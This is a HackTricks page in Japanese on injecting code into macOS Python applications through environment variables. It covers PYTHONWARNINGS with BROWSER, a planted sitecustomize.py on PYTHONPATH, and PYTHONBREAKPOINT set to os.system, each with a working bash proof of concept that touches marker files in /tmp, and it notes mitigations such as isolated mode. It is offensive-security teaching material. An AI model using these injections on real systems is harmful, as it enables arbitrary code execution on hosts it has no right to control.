# macOS Python Application Injection

{{#include ../../../banners/hacktricks-training.md}}

## `PYTHONWARNINGS` および `BROWSER` 環境変数を介した方法

攻撃者が Python process の環境を制御できる場合、`PYTHONWARNINGS` と `BROWSER` の組み合わせにより、細工した warning option の処理中に Python が `antigravity` module を import すると、command execution を引き起こせます。この technique は、`antigravity` が Python の `webbrowser` module を使用して URL を開き、`BROWSER` 環境変数を参照する仕組みに依存しています。<sup>[[1]](#references)</sup>
```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## `PYTHONPATH` と `sitecustomize.py` 経由

通常の起動時、Python の `site` module は site-specific な path を追加し、その後 `sitecustomize` という名前の module の import を試みます。攻撃者が読み取り可能な directory を `PYTHONPATH` の先頭に配置すると、process environment を制御できる攻撃者は、target script より前に Python に payload を import させることができます。`-S` flag は自動的な `site` initialization を無効化し、isolated mode (`-I`) は `PYTHONPATH` を無視し、`-s` と `-E` を暗黙的に有効にします。<sup>[[2]](#references)[[3]](#references)</sup>
```bash
mkdir -p /tmp/python-startup
cat >/tmp/python-startup/sitecustomize.py <<'EOF'
from pathlib import Path
Path('/tmp/python-sitecustomize-executed').touch()
EOF

PYTHONPATH=/tmp/python-startup python3 /tmp/script.py
```
## `PYTHONBREAKPOINT` 経由

Python 3.7（PEP 553）以降、組み込みの `breakpoint()` は `sys.breakpointhook` が指しているものを import して呼び出します。その対象は **`PYTHONBREAKPOINT`** 環境変数（`package.module.callable`）から取得されます。指定されたモジュールの import と callable の呼び出しは、通常デバッガが表示される前に実行されるため、`breakpoint()` に到達するプロセスの環境を制御できる攻撃者は、コード実行を得られます（保守・debugスクリプトでは一般的で、本番環境のパスに残されていることもあります）。<sup>[[4]](#references)</sup>
```bash
cat >/tmp/bp.py <<'EOF'
import sys
print("before")
breakpoint(*sys.argv[1:])
EOF

# breakpoint() invokes the chosen callable with its arguments
PYTHONBREAKPOINT="os.system" python3 /tmp/bp.py "touch /tmp/py-bp-executed"
ls -la /tmp/py-bp-executed
```
`PYTHONWARNINGS`/`PYTHONPATH`とは異なり、これは対象が実際に`breakpoint()`呼び出しに到達する必要がありますが、指定したモジュールの**import side effects**だけでも動作します（import可能な任意のモジュールを指定できます。たとえば`PYTHONPATH`の先頭に配置したモジュールで、トップレベルでコードを実行するものなど）。`PYTHONBREAKPOINT=0`を設定すると、このhookは完全に無効になります。

## References

- [1] [Environment Variablesを使ったHacking - elttam](https://www.elttam.com/blog/env/)
- [2] [site — Site固有のconfiguration hook](https://docs.python.org/3/library/site.html)
- [3] [Pythonのcommand-lineとenvironment](https://docs.python.org/3/using/cmdline.html)
- [4] [PEP 553 — 組み込みのbreakpoint()とPYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
{{#include ../../../banners/hacktricks-training.md}}
